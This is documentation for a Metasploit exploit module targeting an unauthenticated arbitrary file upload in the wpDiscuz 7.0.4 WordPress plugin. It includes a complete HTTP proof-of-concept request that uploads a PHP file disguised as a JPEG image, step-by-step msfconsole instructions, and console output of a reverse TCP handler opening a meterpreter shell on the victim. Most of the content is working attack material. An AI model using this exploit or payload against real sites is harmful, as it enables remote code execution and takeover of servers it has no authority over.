This module exploits an arbitrary file upload in the WordPress wpDiscuz plugin
version 7.0.4. This flaw gave unauthenticated attackers the ability to upload arbitrary files,
including PHP files, and achieve remote code execution on a vulnerable site’s server.

## Proof of Concept

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: URL
Content-Length: 774
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUGWBOKSwsalnzhha
Origin: http://URL
Referer: http://URL
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: 
Connection: close

------WebKitFormBoundaryUGWBOKSwsalnzhha
Content-Disposition: form-data; name="action"

wmuUploadFiles
------WebKitFormBoundaryUGWBOKSwsalnzhha
Content-Disposition: form-data; name="wmu_nonce"

aede3ab0b2
------WebKitFormBoundaryUGWBOKSwsalnzhha
Content-Disposition: form-data; name="wmuAttachmentsData"

undefined
------WebKitFormBoundaryUGWBOKSwsalnzhha
Content-Disposition: form-data; name="wmu_files[0]"; filename="hello.php"
Content-Type: image/jpeg

ÿØÿájExifMM*i>¨ÀÿàJFIFÿÛC

<?php phpinfo();?>
------WebKitFormBoundaryUGWBOKSwsalnzhha
Content-Disposition: form-data; name="postId"

393
------WebKitFormBoundaryUGWBOKSwsalnzhha--

```

More details can be found on [WPSCAN Blog](https://wpscan.com/vulnerability/10333).

## Verification Steps

Confirm that functionality works:
1. Download `wp_wpdiscuz_unauthenticated_file_upload.rb`
1. Move `wp_wpdiscuz_unauthenticated_file_upload.rb` to `/usr/share/metasploit-framework/modules/exploits (Kali Linux)`
1. Start `msfconsole`
1. `use exploit/wp_wpdiscuz_unauthenticated_file_upload`
1. Set the `RHOST`
1. Set the `BLOGPATH` (Links to the post)
1. Set `LHOST` and `LPORT`
1. Run the exploit: `run`
1. Confirm you have now a meterpreter session


## Scenarios

### Ubuntu 18.04 running WordPress 4.9.8

[`Victim: http://127.0.0.1:8080/blogs`]

[`Link to the port http://127.0.0.1:8080/blogs/index.php/2020/12/22/firt-post/`]

```
msf5 > use exploit/wp_wpdiscuz_unauthenticated_file_upload.rb
msf5 exploit(wp_wpdiscuz_unauthenticated_file_upload) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(wp_wpdiscuz_unauthenticated_file_upload) > set blogpath /index.php/2020/12/22/firt-post/
blogpath => /index.php/2020/12/22/firt-post/
msf5 exploit(wp_wpdiscuz_unauthenticated_file_upload) > set TARGETURI blogs
TARGETURI => blogs
msf5 exploit(wp_wpdiscuz_unauthenticated_file_upload) > check
[*] 127.0.0.1:8080 - The target appears to be vulnerable.
msf5 exploit(wp_wpdiscuz_unauthenticated_file_upload) > run

[*] Started reverse TCP handler on 0.0.0.0:8888 
[+] Payload uploaded as kUBJC.php
[*] Calling payload...
[*] Sending stage (39282 bytes) to 13.250.118.98
[*] Meterpreter session 1 opened (10.148.0.11:8888 -> 13.250.118.98:54552) at 2020-12-25 01:34:15 +0000
[!] This exploit may require manual cleanup of 'kUBJC.php' on the target

meterpreter > sysinfo
Computer    : ip-172-31-42-10
OS          : Linux ip-172-31-42-10 5.4.0-1029-aws #30-Ubuntu SMP Tue Oct 20 10:06:38 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > 

```
